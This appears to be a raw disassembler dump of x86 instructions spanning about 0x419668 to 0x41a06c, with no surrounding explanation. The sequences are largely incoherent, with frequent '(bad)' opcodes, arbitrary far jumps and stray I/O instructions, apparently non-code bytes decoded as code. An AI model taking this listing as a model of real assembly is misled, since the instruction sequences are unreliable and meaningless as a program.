  419668:	add    DWORD PTR [eax],eax
  41966a:	add    BYTE PTR [ecx],al
  41966c:	add    BYTE PTR [eax],al
  41966e:	(bad)  
  41966f:	jnp    0x4196ea
  419671:	add    al,0xca
  419673:	push   eax
  419674:	ss xor al,0x83
  419677:	fsub   QWORD PTR [ebx+0x13b648ed]
  41967d:	jl     0x419662
  41967f:	sub    esp,DWORD PTR [ebp+ebp*1-0x4f]
  419683:	das    
  419684:	cmp    ebp,DWORD PTR [ebp*4-0x69937c5e]
  41968b:	xchg   edx,eax
  41968c:	(bad)  
  41968d:	jns    0x419631
  41968f:	jb     0x419680
  419691:	mov    ah,0xdd
  419693:	xor    esp,ecx
  419695:	pop    ebp
  419696:	inc    ebx
  419697:	adc    DWORD PTR [edx-0x75],ebp
  41969a:	nop
  41969b:	fidiv  DWORD PTR [esi-0x41]
  41969f:	shr    DWORD PTR [eax-0x53],0x3d
  4196a3:	hlt    
  4196a4:	mov    bl,0x70
  4196a7:	shr    DWORD PTR [eax+0x1e098c8],0xaf
  4196ae:	dec    edx
  4196af:	shr    BYTE PTR [ebp-0x4eaf1943],0x84
  4196b6:	aaa    
  4196b7:	add    ah,BYTE PTR [edi+0x6de028e3]
  4196bd:	sbb    DWORD PTR [edx],eax
  4196bf:	push   cs
  4196c0:	push   ecx
  4196c1:	jns    0x4196c8
  4196c3:	fsubr  QWORD PTR [ebp-0x1e8ef50]
  4196c9:	pop    edx
  4196ca:	xor    edi,edx
  4196cc:	leave  
  4196cd:	retf   0x9ed
  4196d0:	xor    dh,BYTE PTR [ebx-0x7c1172a7]
  4196d6:	adc    BYTE PTR [ecx],ch
  4196d8:	retf   
  4196d9:	jne    0x4196e0
  4196db:	xchg   edi,eax
  4196dc:	dec    edx
  4196dd:	pusha  
  4196de:	rol    BYTE PTR [edi],cl
  4196e0:	int3   
  4196e1:	stos   BYTE PTR es:[edi],al
  4196e2:	(bad)  
  4196e3:	xchg   esp,eax
  4196e4:	and    eax,0x54ab0973
  4196e9:	mov    ds:0xe395ba8,al
  4196ee:	sub    eax,0x6cd16271
  4196f3:	mov    cl,0x92
  4196f5:	enter  0xafb7,0xf5
  4196f9:	bound  esi,QWORD PTR [ebp+0x76]
  4196fc:	cmp    eax,0x4d19522
  419701:	shl    DWORD PTR [ebx],cl
  419703:	out    0xf5,al
  419705:	pop    ebp
  419706:	sub    eax,0xed1d5fff
  41970b:	mov    ebx,0x5cc46f3a
  419710:	sub    ecx,edi
  419712:	push   esp
  419713:	mov    edx,0xf7a68585
  419718:	and    al,0x9a
  41971a:	mov    DWORD PTR [ecx+0x4e],edi
  41971d:	loope  0x419742
  41971f:	xor    edi,0x1d
  419722:	pop    edi
  419723:	mov    dh,0x94
  419725:	mov    ah,0x73
  419727:	dec    eax
  419728:	mov    dl,0x83
  41972a:	je     0x4196d0
  41972c:	fstp   QWORD PTR ds:0x1064b23e
  419732:	dec    esi
  419733:	call   0x5ef7:0x4239ff99
  41973a:	cwde   
  41973b:	xchg   ebx,eax
  41973c:	outs   dx,BYTE PTR ds:[esi]
  41973d:	je     0x4196da
  41973f:	push   ds
  419740:	xor    eax,0x9b416b7c
  419745:	test   bh,bl
  419747:	sbb    ebp,DWORD PTR [edi-0x326ea02d]
  41974d:	sub    BYTE PTR [edx],al
  41974f:	(bad)  
  419751:	outs   dx,BYTE PTR ds:[esi]
  419752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419753:	dec    edi
  419754:	mov    dh,0x4e
  419756:	pushf  
  419757:	(bad)  
  419758:	push   esp
  419759:	aaa    
  41975a:	xrelease xchg DWORD PTR [edx+0x185bc150],ebx
  419761:	test   eax,0xb1d878a6
  419766:	cmp    bh,cl
  419768:	test   ebx,esp
  41976a:	and    BYTE PTR ds:[ecx+0xff],bl
	...
  4197d5:	add    BYTE PTR [ebx-0x29a8ec1],dh
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xd88dd0ae
  4197e3:	push   es
  4197e4:	mov    al,ds:0x1126757
  4197e9:	add    BYTE PTR [eax],al
  4197eb:	add    DWORD PTR [eax],eax
  4197ed:	add    al,al
  4197ef:	push   ecx
  4197f0:	pop    eax
  4197f1:	dec    ecx
  4197f2:	jbe    0x41982b
  4197f4:	push   0x54
  4197f6:	enter  0x3f85,0x3e
  4197fa:	add    al,0x86
  4197fc:	popa   
  4197fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197fe:	push   edx
  4197ff:	sub    ecx,DWORD PTR [esp+ebp*2-0x5727d34]
  419806:	adc    eax,0xea15fbe0
  41980b:	mov    eax,ds:0xb039ec9d
  419810:	test   BYTE PTR [esi+0x287734d9],ch
  419816:	fyl2x  
  419818:	fnstcw WORD PTR [esp+eax*8+0x3f9ca4f7]
  41981f:	fsub   st(6),st
  419821:	cmp    eax,0x7d54d4dd
  419826:	into   
  419827:	mov    al,0x53
  419829:	mov    bh,0x5f
  41982b:	outs   dx,BYTE PTR ds:[esi]
  41982c:	out    dx,al
  41982d:	inc    edx
  41982e:	lock ret 
  419830:	sub    edx,DWORD PTR [esi+0x10]
  419833:	repz loopne 0x41980e
  419836:	adc    ebx,DWORD PTR ds:0x4bc7192f
  41983c:	cli    
  41983d:	arpl   dx,bp
  41983f:	out    0xea,al
  419841:	test   eax,0xe803dc7a
  419846:	adc    bl,BYTE PTR [esi-0x27]
  419849:	scas   al,BYTE PTR es:[edi]
  41984a:	jns    0x4198b8
  41984c:	shl    DWORD PTR [eax-0x10],1
  41984f:	retf   0xb2ad
  419852:	ins    DWORD PTR es:[edi],dx
  419853:	xlat   BYTE PTR ds:[ebx]
  419854:	mov    ecx,0xdf85ca2
  419859:	icebp  
  41985a:	pop    es
  41985b:	dec    ebx
  41985c:	sbb    al,BYTE PTR [ecx+0x79]
  41985f:	sbb    esi,DWORD PTR [ebx]
  419861:	xchg   edi,eax
  419862:	dec    esi
  419863:	mov    eax,0xc9db4db2
  419868:	out    dx,ax
  41986a:	inc    eax
  41986b:	scas   al,BYTE PTR es:[edi]
  41986c:	and    al,0xcb
  41986e:	ror    BYTE PTR [edi+edx*8+0x50],1
  419872:	(bad)  
  419873:	into   
  419874:	inc    edi
  419875:	xchg   edx,eax
  419876:	repnz mov ebp,0xc7d2803d
  41987c:	mov    bl,0x17
  41987e:	mov    es,esp
  419880:	lahf   
  419881:	ret    
  419882:	aaa    
  419883:	xor    dh,BYTE PTR [ecx+0x409fb13e]
  419889:	jmp    0x419908
  41988b:	push   ebp
  41988c:	mov    ah,0xd5
  41988e:	sbb    BYTE PTR [edi],ah
  419890:	(bad)
  419893:	jp     0x4198de
  419895:	adc    eax,0x7fb14ab9
  41989a:	mov    edx,0x67fe3d4d
  41989f:	(bad)
  4198a2:	test   BYTE PTR ds:0x4b8222d7,0x4e
  4198a9:	add    DWORD PTR [ebp+0x5a90904],0xe7285a3d
  4198b3:	push   ds
  4198b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198b5:	mov    ds:0x643a2137,al
  4198ba:	and    DWORD PTR [eax-0x39],eax
  4198bd:	cmc    
  4198be:	addr16 adc eax,0x3b54a257
  4198c4:	pop    ds
  4198c5:	sub    BYTE PTR [ebp+ecx*1+0x67],al
  4198c9:	inc    ecx
  4198ca:	jbe    0x41993b
  4198cc:	xchg   DWORD PTR [ebx+0x5f],ebx
  4198cf:	aas    
  4198d0:	fbld   TBYTE PTR [esi+0x5]
  4198d3:	or     eax,0xf40147c2
  4198d8:	in     al,dx
  4198d9:	jp     0x41987a
  4198db:	cmp    eax,ecx
  4198dd:	dec    ecx
  4198de:	mov    ch,ah
  4198e0:	sbb    esp,eax
  4198e2:	adc    DWORD PTR [esp+esi*2],ebp
  4198e5:	jmp    0x6b5c:0xc7c3b9ae
  4198ec:	mov    eax,ds:0xec
	...
  419955:	add    BYTE PTR [edx-0x201eb8e7],al
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fnsave [esi]
  419963:	loope  0x41996f
  419965:	dec    ecx
  419966:	adc    eax,DWORD PTR [bx+di]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    BYTE PTR [eax+0x35],ch
  419970:	jecxz  0x419971
  419972:	inc    ecx
  419973:	imul   ebx,DWORD PTR [edx-0x303620ef],0xffffff8f
  41997a:	inc    ebp
  41997b:	jnp    0x419971
  41997d:	cmp    al,0x83
  41997f:	inc    ebp
  419980:	push   es
  419981:	outs   dx,DWORD PTR ds:[esi]
  419982:	add    cl,ah
  419984:	push   eax
  419985:	fnsave [ebp+0x72]
  419988:	iret   
  419989:	sbb    eax,0x8567986e
  41998e:	stc    
  41998f:	jecxz  0x41993a
  419991:	xor    eax,0xef342173
  419996:	jmp    0xbb0c:0xd1aa9953
  41999d:	ret    0xa652
  4199a0:	xor    al,cl
  4199a2:	lock shl DWORD PTR [edx+0x5f3671a3],1
  4199a9:	sub    al,0x9a
  4199ab:	dec    ebp
  4199ac:	repz mov ah,dl
  4199af:	aaa    
  4199b0:	int    0x2d
  4199b2:	and    esp,DWORD PTR [edi+ebp*1+0x4a]
  4199b6:	sbb    al,0xc7
  4199b8:	sub    BYTE PTR [ecx+0x76],0xe4
  4199bc:	imul   esi,DWORD PTR [edx],0x5
  4199bf:	clc    
  4199c0:	stos   DWORD PTR es:[edi],eax
  4199c1:	aaa    
  4199c2:	les    edi,FWORD PTR [ebp-0x2a0b9525]
  4199c8:	xor    BYTE PTR [edx],bh
  4199ca:	pop    ecx
  4199cb:	repz push es
  4199cd:	test   al,0xf5
  4199cf:	xchg   ebx,eax
  4199d0:	test   ecx,ecx
  4199d2:	push   edx
  4199d3:	pop    ds
  4199d4:	sti    
  4199d5:	rol    BYTE PTR [ebp-0x66047b3a],0xb9
  4199dc:	mov    ebx,0xad9dcdc3
  4199e1:	mov    ebx,0x5aa69aaf
  4199e6:	cmc    
  4199e7:	inc    esp
  4199e8:	pop    ebx
  4199e9:	pusha  
  4199ea:	pop    edi
  4199eb:	stos   BYTE PTR es:[edi],al
  4199ec:	jmp    0x419a1e
  4199ee:	adc    esi,DWORD PTR [ebp+edi*1+0x3f]
  4199f2:	push   esp
  4199f3:	lods   eax,DWORD PTR ds:[esi]
  4199f4:	pop    ebx
  4199f5:	into   
  4199f6:	mov    al,ds:0xc7eed14b
  4199fb:	dec    esi
  4199fc:	(bad)  
  4199fd:	jnp    0x419a06
  4199ff:	je     0x4199d6
  419a01:	xor    cl,BYTE PTR [eax-0x8]
  419a04:	mov    WORD PTR [eax-0x6c],?
  419a07:	enter  0xfbd5,0x57
  419a0b:	aad    0x3e
  419a0d:	cmc    
  419a0e:	(bad)  
  419a0f:	dec    esi
  419a10:	fcom   DWORD PTR [ecx+edx*4-0x6b52f69]
  419a17:	cwde   
  419a18:	out    dx,al
  419a19:	cs sub al,0xc9
  419a1c:	fwait
  419a1d:	push   esp
  419a1e:	nop
  419a1f:	cmp    DWORD PTR [esi],0x16569332
  419a25:	push   ss
  419a26:	mov    WORD PTR [esi+0x7d709f61],gs
  419a2c:	mov    ds:0xab694f,eax
  419a31:	inc    bp
  419a33:	pusha  
  419a34:	and    ecx,DWORD PTR [edx-0x46dc1559]
  419a3a:	add    ch,BYTE PTR [ecx+0x42293031]
  419a40:	add    bh,BYTE PTR [edi]
  419a42:	jbe    0x419ac3
  419a44:	add    bl,BYTE PTR [ecx-0x72]
  419a47:	add    al,dh
  419a49:	push   ds
  419a4a:	hlt    
  419a4b:	ror    BYTE PTR [ebp+0x1a311156],1
  419a51:	and    BYTE PTR [ecx-0x191f2d10],bh
  419a57:	out    dx,al
  419a58:	adc    eax,DWORD PTR [ebx-0x57978058]
  419a5e:	int    0x62
  419a60:	fisttp QWORD PTR ds:[ebp-0x49d766ae]
  419a67:	xor    BYTE PTR [esp+edi*8-0xb],dh
  419a6b:	nop
  419a6c:	add    DWORD PTR [edi],0x0
	...
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0xd4c080c2,cl
  419ae5:	in     eax,0x67
  419ae7:	adc    al,0x1
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    BYTE PTR [edx],cl
  419aef:	inc    edx
  419af0:	in     eax,0xb0
  419af2:	sbb    BYTE PTR [ebx],dh
  419af4:	in     al,dx
  419af5:	fbstp  TBYTE PTR [edi-0x63]
  419af8:	mov    al,ds:0x6e6d8a39
  419afd:	jno    0x419b33
  419aff:	add    eax,0xae282d5e
  419b04:	push   cs
  419b05:	xor    ecx,DWORD PTR [esi-0x25]
  419b08:	dec    ebx
  419b09:	lods   al,BYTE PTR ds:[esi]
  419b0a:	(bad)  
  419b0b:	out    dx,al
  419b0c:	jb     0x419af0
  419b0e:	cmp    edi,0x81d2a5a1
  419b14:	jbe    0x419b13
  419b16:	sub    al,0x79
  419b18:	jbe    0x419af3
  419b1a:	sub    ebx,DWORD PTR [ecx]
  419b1c:	mov    ecx,0x1d7ce42a
  419b21:	stc    
  419b22:	(bad)  
  419b23:	pop    edx
  419b24:	or     BYTE PTR [eax-0x6b],dl
  419b27:	icebp  
  419b28:	inc    edi
  419b29:	pop    ds
  419b2a:	lods   al,BYTE PTR ds:[esi]
  419b2b:	adc    edi,eax
  419b2d:	into   
  419b2e:	sub    ch,BYTE PTR [ebx]
  419b30:	icebp  
  419b31:	push   ds
  419b32:	pop    edi
  419b33:	xor    DWORD PTR [edi-0x4a],ecx
  419b36:	add    al,0x89
  419b38:	inc    esp
  419b39:	inc    edi
  419b3a:	dec    esi
  419b3b:	mov    ebp,0x95eab6e5
  419b40:	dec    esi
  419b41:	test   BYTE PTR ds:0xd41d11ab,ch
  419b47:	sub    bl,BYTE PTR [ecx-0x6574ed82]
  419b4d:	push   edi
  419b4e:	ror    DWORD PTR [ebp+0x515ddec8],0xff
  419b55:	sub    eax,0x413ae2e0
  419b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b5b:	adc    eax,0xbb2df534
  419b60:	test   al,0x39
  419b62:	push   edi
  419b63:	jb     0x419b97
  419b65:	imul   ecx,esi,0x8483b164
  419b6b:	sub    BYTE PTR [ecx],bh
  419b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b6e:	out    0x1b,al
  419b70:	cmc    
  419b71:	push   edx
  419b72:	cmc    
  419b73:	or     DWORD PTR [eax-0x5b],ebp
  419b76:	nop
  419b77:	add    eax,0x387be317
  419b7c:	test   BYTE PTR ds:0xc90fe381,cl
  419b82:	cld    
  419b83:	sub    eax,0x51037c5
  419b88:	cdq    
  419b89:	enter  0x5be1,0xea
  419b8d:	cwde   
  419b8e:	addr16 fwait
  419b90:	bound  edx,QWORD PTR [ecx]
  419b92:	push   0xffffffea
  419b94:	in     al,dx
  419b95:	mov    eax,ds:0x1cc11a1d
  419b9a:	call   0x30ebcd15
  419b9f:	pop    eax
  419ba0:	pop    ss
  419ba1:	and    edi,ecx
  419ba3:	es inc esp
  419ba5:	cdq    
  419ba6:	fs (bad) 
  419ba8:	jo     0x419b8b
  419baa:	cld    
  419bab:	mov    edi,0xde3a2128
  419bb0:	test   eax,0x3205be7d
  419bb5:	dec    esp
  419bb6:	xchg   ebx,esp
  419bb8:	shl    BYTE PTR [ecx],0x67
  419bbb:	std    
  419bbc:	dec    esi
  419bbd:	fsub   st(7),st
  419bbf:	jnp    0x419bdb
  419bc1:	cmp    dh,BYTE PTR [bx-0x69]
  419bc5:	jmp    0xb2e65ac7
  419bca:	dec    ebx
  419bcb:	dec    ecx
  419bcc:	jmp    0x419c0b
  419bce:	cmp    eax,ebx
  419bd0:	std    
  419bd1:	lock mov eax,0xc4bde384
  419bd7:	out    dx,eax
  419bd8:	retf   
  419bd9:	in     eax,0x9f
  419bdb:	(bad)  
  419bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bdd:	dec    edi
  419bde:	mul    DWORD PTR [edi]
  419be0:	aam    0xe6
  419be2:	or     ebp,DWORD PTR [ebx+0x25]
  419be5:	xchg   ecx,eax
  419be6:	dec    edi
  419be7:	fadd   QWORD PTR [eax]
  419be9:	pop    es
  419bea:	dec    edi
  419beb:	shl    BYTE PTR [ebx+0x7d],0x0
	...
  419c53:	add    BYTE PTR [eax],al
  419c55:	add    BYTE PTR [edx-0x3c],cl
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0xb8
  419c63:	lock mov ecx,0x1156730
  419c69:	add    BYTE PTR [eax],al
  419c6b:	add    DWORD PTR [eax],eax
  419c6d:	add    BYTE PTR [eax],cl
  419c6f:	mov    ah,0xe7
  419c71:	sub    al,0x7f
  419c73:	jecxz  0x419cba
  419c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c76:	xchg   DWORD PTR [edi-0x3f],edi
  419c79:	rol    DWORD PTR [ebp-0x24],cl
  419c7c:	mov    edi,ebp
  419c7e:	and    BYTE PTR [edx+0x71f08f54],bl
  419c84:	adc    al,BYTE PTR [ecx]
  419c86:	mov    bh,cl
  419c88:	jg     0x419c6a
  419c8a:	mov    esi,0xe555f725
  419c8f:	(bad)  
  419c90:	sbb    ah,BYTE PTR [eax]
  419c92:	dec    ebx
  419c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c94:	or     DWORD PTR [edx+ebp*8-0x1bd646a2],edi
  419c9b:	les    ebp,FWORD PTR [eax]
  419c9d:	xchg   ecx,eax
  419c9e:	test   DWORD PTR [edx+0x5bf7eabd],0x6c7c5d8
  419ca8:	(bad)  
  419ca9:	popf   
  419caa:	data16 fbld TBYTE PTR [ebx-0x59379b66]
  419cb1:	in     eax,dx
  419cb2:	xor    BYTE PTR [ebx],cl
  419cb4:	cmc    
  419cb5:	in     eax,dx
  419cb6:	rol    DWORD PTR [edx+0x78],0x99
  419cba:	popf   
  419cbb:	xor    DWORD PTR [ebp-0x3dbd8deb],ebx
  419cc1:	add    DWORD PTR [esi],edx
  419cc3:	fwait
  419cc4:	push   esi
  419cc5:	adc    esp,ebp
  419cc7:	jbe    0x419c8e
  419cc9:	xchg   DWORD PTR [esi],ebp
  419ccb:	cmc    
  419ccc:	ja     0x419d37
  419cce:	adc    ah,BYTE PTR [ebx+0x58]
  419cd1:	add    BYTE PTR [ebp-0x44],ah
  419cd4:	rcr    DWORD PTR [ebp+0x69],cl
  419cd7:	popf   
  419cd8:	mov    ds:0x4dfa4083,eax
  419cdd:	test   eax,0xf3395f0a
  419ce2:	pop    ecx
  419ce3:	mov    eax,ds:0x412719b1
  419ce8:	into   
  419ce9:	int    0xb5
  419ceb:	fs enter 0xd8db,0xd9
  419cf0:	loope  0x419cf2
  419cf2:	add    DWORD PTR [ebx-0x2cda6b3a],edx
  419cf8:	pusha  
  419cf9:	shl    BYTE PTR [esi+0x3c],1
  419cfc:	nop
  419cfd:	mov    esi,ecx
  419cff:	stc    
  419d00:	cmp    eax,0x59f683d5
  419d05:	loopne 0x419d4b
  419d07:	dec    ebx
  419d08:	(bad)  
  419d09:	xchg   ebx,eax
  419d0a:	mov    al,0xa
  419d0c:	mov    esp,0x5548143e
  419d11:	inc    eax
  419d12:	mov    ecx,0x5c0dd9d9
  419d17:	aas    
  419d18:	repnz (bad) 
  419d1a:	push   esp
  419d1b:	jmp    0x6b906d28
  419d20:	push   ecx
  419d21:	jbe    0x419ca5
  419d23:	scas   eax,DWORD PTR es:[edi]
  419d24:	pusha  
  419d25:	xlat   BYTE PTR ds:[ebx]
  419d26:	fild   DWORD PTR [edi]
  419d28:	add    DWORD PTR [eax],esp
  419d2a:	out    dx,al
  419d2b:	fldcw  WORD PTR [eax+ebp*2-0x6ec06089]
  419d32:	stc    
  419d33:	mov    cl,0xdf
  419d35:	call   0xcf1ccaab
  419d3a:	push   esp
  419d3b:	mov    al,0xb8
  419d3d:	mov    al,ds:0xf28ae800
  419d42:	xchg   esp,eax
  419d43:	clc    
  419d44:	dec    ecx
  419d45:	mov    ah,0xfe
  419d47:	out    0x22,al
  419d49:	xchg   cl,ah
  419d4b:	xchg   edx,eax
  419d4c:	or     bl,BYTE PTR [eax+0x25]
  419d4f:	neg    DWORD PTR [ebp-0x43bd543b]
  419d55:	fs dec esi
  419d57:	(bad)  
  419d59:	adc    eax,0x2036edee
  419d5e:	into   
  419d5f:	leave  
  419d60:	dec    esi
  419d61:	(bad)  
  419d62:	out    dx,eax
  419d63:	lods   eax,DWORD PTR ds:[esi]
  419d64:	mov    ah,0x34
  419d66:	popa   
  419d67:	sub    esi,DWORD PTR [ebx+eax*2]
  419d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d6b:	(bad)  
  419d6d:	and    DWORD PTR [eax],eax
	...
  419dd3:	add    BYTE PTR [eax],al
  419dd5:	add    al,dh
  419dd7:	xchg   edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fidiv  DWORD PTR ss:[esi+0x5f]
  419de4:	xchg   ebx,eax
  419de5:	and    BYTE PTR [edi+0x16],0x1
  419de9:	add    BYTE PTR [eax],al
  419deb:	add    DWORD PTR [eax],eax
  419ded:	add    BYTE PTR [edx+0x2d],al
  419df0:	in     al,0x57
  419df2:	xor    edx,DWORD PTR [esi]
  419df4:	sub    DWORD PTR [ecx],esi
  419df6:	retf   0x6c76
  419df9:	outs   dx,DWORD PTR ds:[esi]
  419dfa:	mov    ?,esi
  419dfc:	mov    dh,0x7c
  419dfe:	and    eax,0x9ea02751
  419e03:	sbb    BYTE PTR [esi-0x6b],dh
  419e06:	and    esp,DWORD PTR [esi-0x80]
  419e09:	enter  0xdc86,0x90
  419e0d:	adc    al,0x5b
  419e0f:	cmc    
  419e10:	mov    eax,0xf0627f99
  419e15:	ret    
  419e16:	jns    0x419dd3
  419e18:	and    eax,0x9a755442
  419e1d:	repnz pop eax
  419e1f:	add    eax,DWORD PTR cs:0x949f32c1
  419e26:	dec    ebp
  419e27:	sbb    al,0xc7
  419e29:	nop
  419e2a:	repnz sar cl,0x4a
  419e2e:	idiv   DWORD PTR [ebp+0x5e]
  419e31:	dec    eax
  419e32:	inc    esp
  419e33:	pop    ds
  419e34:	adc    ebx,DWORD PTR [esi-0x1c]
  419e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e38:	mov    dh,0x4f
  419e3a:	mov    dh,0x59
  419e3c:	(bad)  
  419e3d:	data16 out 0x90,al
  419e40:	bound  ebp,QWORD PTR [edi-0x1e]
  419e43:	call   0x849d7444
  419e48:	inc    ecx
  419e49:	hlt    
  419e4a:	inc    edi
  419e4b:	pop    esi
  419e4c:	inc    ebx
  419e4d:	add    esp,DWORD PTR [ecx+0x29]
  419e50:	pusha  
  419e51:	or     al,0x75
  419e53:	sbb    eax,0xedaeae1e
  419e58:	ins    BYTE PTR es:[edi],dx
  419e59:	psubw  mm1,mm0
  419e5c:	aad    0xba
  419e5e:	ds sub al,0x46
  419e61:	arpl   WORD PTR [eax+0x16],cx
  419e64:	mov    esi,0xc768de5f
  419e69:	mov    al,ds:0x3a1a9768
  419e6e:	push   esp
  419e6f:	xchg   edi,eax
  419e70:	xchg   edx,eax
  419e71:	push   es
  419e72:	sbb    ebx,esi
  419e74:	mov    bl,0x4b
  419e76:	(bad)  
  419e78:	dec    ebp
  419e79:	or     bh,dh
  419e7b:	mov    ds:0x8b883a23,al
  419e80:	test   eax,0x1eb8eb1d
  419e85:	fwait
  419e86:	pop    ebp
  419e87:	mov    DWORD PTR [ecx],esi
  419e89:	and    al,BYTE PTR [ebp-0x40]
  419e8c:	sub    BYTE PTR [edx],ah
  419e8e:	stos   DWORD PTR es:[edi],eax
  419e8f:	(bad)  
  419e90:	xchg   esi,eax
  419e91:	fldcw  WORD PTR [eax+0x7aeb7736]
  419e97:	mov    ds:0x632f85df,al
  419e9c:	pop    ebp
  419e9d:	lock lock mul cl
  419ea1:	dec    esi
  419ea2:	arpl   WORD PTR ds:0xf2e014,sp
  419ea8:	jle    0x419f06
  419eaa:	fdivr  DWORD PTR [ebx+0x26]
  419ead:	sbb    BYTE PTR [edi+eax*2-0x48],cl
  419eb1:	xchg   edi,eax
  419eb2:	in     al,dx
  419eb3:	loope  0x419f05
  419eb5:	jae    0x419e53
  419eb7:	popf   
  419eb8:	fwait
  419eb9:	lea    esp,[edi-0x71]
  419ebc:	in     al,0x70
  419ebe:	fdivr  DWORD PTR [edx+eax*8]
  419ec1:	dec    edi
  419ec2:	aas    
  419ec3:	gs (bad) 
  419ec5:	pop    ebx
  419ec6:	in     al,dx
  419ec7:	mov    WORD PTR [ebp-0x6f],fs
  419eca:	jle    0x419f3e
  419ecc:	scas   eax,DWORD PTR es:[edi]
  419ecd:	sahf   
  419ece:	or     dl,ch
  419ed0:	push   es
  419ed1:	and    dh,BYTE PTR [esi]
  419ed3:	ret    
  419ed4:	add    eax,0x27c66884
  419ed9:	nop
  419eda:	and    DWORD PTR [edx],esi
  419edc:	pop    ss
  419edd:	jmp    0x419f26
  419edf:	mov    DWORD PTR ss:[edi+0x6c],ebx
  419ee3:	xchg   ecx,eax
  419ee4:	mov    bh,0xda
  419ee6:	das    
  419ee7:	mov    ebx,0xd2c66e76
  419eec:	cs pop esi
	...
  419f56:	xchg   eax,ebx
  419f58:	pop    ss
  419f59:	lds    ebx,FWORD PTR [edi-0x31]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	outs   dx,DWORD PTR ds:[esi]
  419f63:	or     BYTE PTR [ebx],0x8f
  419f66:	addr16 pop ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	test   al,0x78
  419f70:	mov    al,ds:0x9cc40d34
  419f75:	in     eax,dx
  419f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f77:	sub    ch,ah
  419f79:	dec    ecx
  419f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f7b:	int    0x35
  419f7d:	or     ecx,DWORD PTR [ebp-0xa669159]
  419f83:	cmp    bl,dh
  419f85:	mov    dl,0x96
  419f87:	rol    DWORD PTR [edx+0x18],0x78
  419f8b:	or     eax,0x42d7b7b9
  419f90:	sub    ah,ah
  419f92:	bound  eax,QWORD PTR [ebp-0x80]
  419f95:	push   eax
  419f96:	es add bl,0xd3
  419f9a:	add    esi,DWORD PTR [edx+0x2a]
  419f9d:	call   DWORD PTR [ebx]
  419f9f:	inc    ebp
  419fa0:	je     0x419fe9
  419fa2:	mov    eax,0xd5c9db5c
  419fa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fa8:	je     0x419fe7
  419faa:	dec    ebp
  419fab:	or     eax,0xb60a85c6
  419fb0:	push   edx
  419fb1:	int3   
  419fb2:	jmp    0x5db7:0x19ff135b
  419fb9:	mov    edx,0xf3ff0880
  419fbe:	lock push eax
  419fc0:	xchg   BYTE PTR [ebp+0xe],dh
  419fc3:	inc    esp
  419fc4:	pusha  
  419fc5:	or     eax,0x7780e08f
  419fca:	push   ecx
  419fcb:	test   al,0x26
  419fcd:	rcl    BYTE PTR [eax+0x4d],1
  419fd0:	jl     0x41a039
  419fd2:	sbb    bh,bh
  419fd4:	repnz adc al,0x29
  419fd7:	xor    DWORD PTR [esp+edi*4-0x7b],esi
  419fdb:	add    eax,0x433ef777
  419fe0:	sbb    dh,bh
  419fe2:	test   edx,0xd34248f1
  419fe8:	gs mov edx,0x5968cd48
  419fee:	retf   0x389e
  419ff1:	sub    eax,0x5b22b18a
  419ff6:	into   
  419ff7:	das    
  419ff8:	push   ebp
  419ff9:	clc    
  419ffa:	popf   
  419ffb:	push   edx
  419ffc:	pushf  
  419ffd:	mov    ch,0xb4
  419fff:	sub    ebp,DWORD PTR [edx-0x19]
  41a002:	frstor ds:0xa743e135
  41a008:	jmp    0x3207:0x411bc6bb
  41a00f:	or     bh,bh
  41a011:	push   edx
  41a012:	out    dx,eax
  41a013:	ins    BYTE PTR es:[edi],dx
  41a014:	ins    DWORD PTR es:[edi],dx
  41a015:	and    DWORD PTR [eax+0x423360b0],ebx
  41a01b:	cmp    BYTE PTR [ebp+0x3],dh
  41a01e:	(bad)  
  41a01f:	fist   WORD PTR [eax-0x6f]
  41a022:	mov    ecx,0x985b527
  41a027:	sbb    DWORD PTR [ebp-0x4cd6a3f7],edi
  41a02d:	mov    BYTE PTR ds:0x19026e37,bh
  41a033:	fisubr DWORD PTR [edx-0x65]
  41a036:	mov    eax,0x308fcf4b
  41a03b:	jbe    0x419ffe
  41a03d:	loop   0x41a077
  41a03f:	out    0x7e,eax
  41a041:	fidiv  DWORD PTR [edi-0x7304c8aa]
  41a047:	and    ecx,0x5a
  41a04a:	jle    0x41a035
  41a04c:	jecxz  0x41a0a7
  41a04e:	pop    ecx
  41a04f:	xor    ch,BYTE PTR [ebp+0x53b3c3d7]
  41a055:	jp     0x41a005
  41a057:	mov    eax,0x666ae2c5
  41a05c:	in     al,dx
  41a05d:	sbb    esi,DWORD PTR [esi-0x51]
  41a060:	push   esi
  41a061:	add    BYTE PTR ds:0x5a5a188d,bl
  41a067:	mov    ebp,0x391eb207
  41a06c:	mov    al,ds:0x13
